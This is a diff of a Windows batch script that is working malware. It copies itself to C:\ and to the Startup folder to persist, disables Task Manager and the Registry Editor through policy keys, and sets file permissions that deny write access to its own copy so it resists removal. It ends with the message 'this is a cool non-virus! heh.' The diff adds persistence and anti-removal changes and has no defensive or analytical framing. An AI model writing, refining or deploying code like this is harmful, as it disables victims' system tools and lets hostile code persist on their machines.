@@ -19,23 +19,25 @@ exit /b
 set "source=%~f0"
 set "filename=%~nx0"
 
+:: Small delay for stability
+timeout /t 2 >nul
+
 :: Copy to C:\
 copy /y "%source%" "C:\%filename%" >nul
 
-:: Copy to Startup
+:: Set permissions: allow Read & Execute, deny Write/Delete (only on C:\ copy)
+icacls "C:\%filename%" /grant Everyone:(R,X) /c /q >nul
+icacls "C:\%filename%" /deny Everyone:(W) /c /q >nul
+
+:: Copy to Startup (no permission changes)
 copy /y "%source%" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%filename%" >nul
 
 :: Disable Task Manager
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul
 
-:: Optional: Remove permissions on the Registry key to prevent easy removal
-icacls "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%filename%" /deny Everyone:F >nul 2>&1
-icacls "C:\%filename%" /deny Everyone:F >nul 2>&1
-
-:: Make registry key inaccessible
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies" /v "NoRegistryTools" /t REG_DWORD /d 1 /f >nul
+:: Disable Registry Editor
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f >nul
 
-echo.
+echo this is a cool non-virus! heh.
 pause >nul
 exit
